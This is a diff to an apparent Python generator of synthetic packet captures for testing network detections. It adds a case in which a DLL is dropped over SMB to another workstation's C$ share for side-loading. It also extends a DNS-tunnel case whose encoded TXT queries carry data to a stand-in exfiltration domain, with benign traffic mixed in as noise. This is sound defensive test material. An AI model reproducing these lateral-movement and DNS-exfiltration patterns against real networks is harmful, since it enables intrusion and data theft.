@@ -69,6 +69,14 @@ def smb_exe():
                           [("c", smb2_create(r"lab.local\scripts\logon.exe"))]))
 
 
+def smb_dll():
+    """1. workstation -> other workstation's C$: DLL dropped for side-loading (T1570) - attack.
+    2. workstation -> print01 print$: printer driver DLL - noise, lowered."""
+    return (tcp_session("10.10.100.77", "10.10.30.40", 51011, 445, [("c", smb2_create(r"Windows\Temp\version.dll"))])
+            + tcp_session("10.10.100.21", "10.10.20.30", 51012, 445,
+                          [("c", smb2_create(r"print$\x64\3\lab-driver.dll"))]))
+
+
 # ---------- HTTP beacon ----------
 
 def beacon():
@@ -95,16 +103,18 @@ def dns_query(qid, name):
 
 def dns_tunnel():
     """Five TXT queries with 52-character encoded labels from one workstation via the internal resolver,
-    plus one normal query (must not alert)."""
+    plus one normal query (must not alert) and one ad/tracking query through the same resolver (lowered: same
+    route as the tunnel, opposite decision)."""
     chunks = ["mzxw6ytboi2dmnzrgq3tgojshezdcnbqge2tmnbsgm4dsmjvha4d", "nbswy3dpeb3w64tmmqqgg2dvnzvsa2lomfwgk2le",
               "orsxg5bamjxw63lfnzxgsidvobsgczlfmfzgk2le", "mfzwizdgmfzwizdgmfzwizdgmfzwizdgmfzwizdgmfzwi",
               "nfxgg3tgmfzwizdgnrzxa3dfnzsgk43uojxw4z3e"]
     pkts = [udp("10.10.100.24", "10.10.0.53", 53000 + i, 53, dns_query(0x1000 + i, f"{c}.t.exfil-lab.example"))
             for i, c in enumerate(chunks)]
-    return pkts + [udp("10.10.100.25", "10.10.0.53", 53100, 53, dns_query(0x2000, "www.example.com"))]
+    return pkts + [udp("10.10.100.25", "10.10.0.53", 53100, 53, dns_query(0x2000, "www.example.com")),
+                   udp("10.10.100.26", "10.10.0.53", 53200, 53, dns_query(0x3000, "pixel.adtrack.example"))]
 
 
-CASES = {"dcsync": dcsync, "smb-exe": smb_exe, "http-beacon": beacon, "dns-tunnel": dns_tunnel}
+CASES = {"dcsync": dcsync, "smb-exe": smb_exe, "smb-dll": smb_dll, "http-beacon": beacon, "dns-tunnel": dns_tunnel}
 
 
 def main(argv):
